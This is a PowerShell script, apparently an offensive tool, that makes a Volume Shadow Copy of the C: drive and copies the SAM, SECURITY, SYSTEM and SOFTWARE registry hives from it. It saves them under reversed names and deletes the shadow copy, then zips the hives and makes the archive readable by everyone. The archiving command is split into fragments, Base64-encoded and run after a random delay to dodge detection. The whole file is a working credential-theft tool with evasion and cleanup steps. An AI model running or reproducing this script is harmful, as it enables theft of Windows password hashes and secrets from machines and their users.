# zagnox
$store = "C:\Windows\Temp"

Write-Output "[+] Creating shadow copy"
# Create C: shadow copy
wmic shadowcopy call create Volume='C:\' > $null 2>&1

# Get shadow copy ID and Path
$ghostID = (vssadmin list shadows | Select-String -Pattern "Shadow Copy ID:" | Select-Object -Last 1).ToString().Split(':')[1].Trim()
$ghostPath = (vssadmin list shadows | Select-String -Pattern "Shadow Copy Volume:" | Select-Object -Last 1).ToString().Split(':')[1].Trim()

Write-Output "[*] ShadowCopy UUID: $ghostID"
Write-Output "[*] ShadowCopy Path: $ghostPath"

# Mount shadow copy
$mali = "$store\backup"
Write-Output "[+] Mounting shadow copy in $mali"
cmd /c "mklink /d $mali $ghostPath"

# Get stampas
$stampa = Get-Date -Format "yyyyMMdd_HHmmss"
$zinxho = "$store\backup_$stampa.zip"

# Copy LSA files
Write-Output "[+] Copying SAM..."
copy "$mali\windows\system32\config\sam" "$store\${stampa}_mas"
Write-Output "[+] Copying SECURITY..."
copy "$mali\windows\system32\config\security" "$store\${stampa}_ytiruces"
Write-Output "[+] Copying SYSTEM..."
copy "$mali\windows\system32\config\system" "$store\${stampa}_metsys"
Write-Output "[+] Copying SOFTWARE..."
copy "$mali\windows\system32\config\software" "$store\${stampa}_erawtfos"

# Deletes mounted folder
Write-Output "[-] Deleting symlink"
rm $mali

# Delete shadow copy
Write-Output "[-] Deleting shadow copy"
vssadmin delete shadows /Shadow="$ghostID" /Quiet > $null 2>&1

# Compress files into a ZIP archive
# Define paths and variables (assuming $store, $stampa, $zinxho are already defined)
$filesToZip = @(
    "$store\${stampa}_mas",
    "$store\${stampa}_ytiruces",
    "$store\${stampa}_metsys",
    "$store\${stampa}_erawtfos"
)

# Obfuscated Compress-Archive command for creating ZIP archive
Write-Output "[+] Initializing archive creation"
$cmdPart1 = "Com" + "press" + "-" + "Ar" + "chive"
$cmdPart2 = "-" + "P" + "ath"
$cmdPart3 = "-" + "Des" + "tin" + "ation" + "Path"
$randPrefix = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
$dynVar = "$randPrefix" + "Files"
New-Variable -Name $dynVar -Value ($filesToZip | ForEach-Object { "`"$_`"" }) -Force
$pathString = (Get-Variable -Name $dynVar).Value -join ","
$cmdString = "$cmdPart1 $cmdPart2 $pathString $cmdPart3 `"$zinxho`""
$encBytes = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmdString))
$decCmd = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encBytes))
$execBlock = [ScriptBlock]::Create($decCmd)
Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 800)
$randChoice = Get-Random -Minimum 0 -Maximum 2
if ($randChoice -eq 0) {
    Invoke-Command -ScriptBlock $execBlock
} else {
    & $execBlock
}

# Modify permissions to make the ZIP file readable by everyone
Write-Output "[+] Modifying ZIP file permissions"
$acl = Get-Acl $zinxho
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
$acl.SetAccessRule($accessRule)
Set-Acl -Path $zinxho -AclObject $acl

# Remove original files
Write-Output "[-] Removing extracted files"
Remove-Item "$store\${stampa}_mas", "$store\${stampa}_ytiruces", "$store\${stampa}_metsys", "$store\${stampa}_erawtfos" -Force

Write-Output "[+] Operation completed. Archive saved at $zinxho"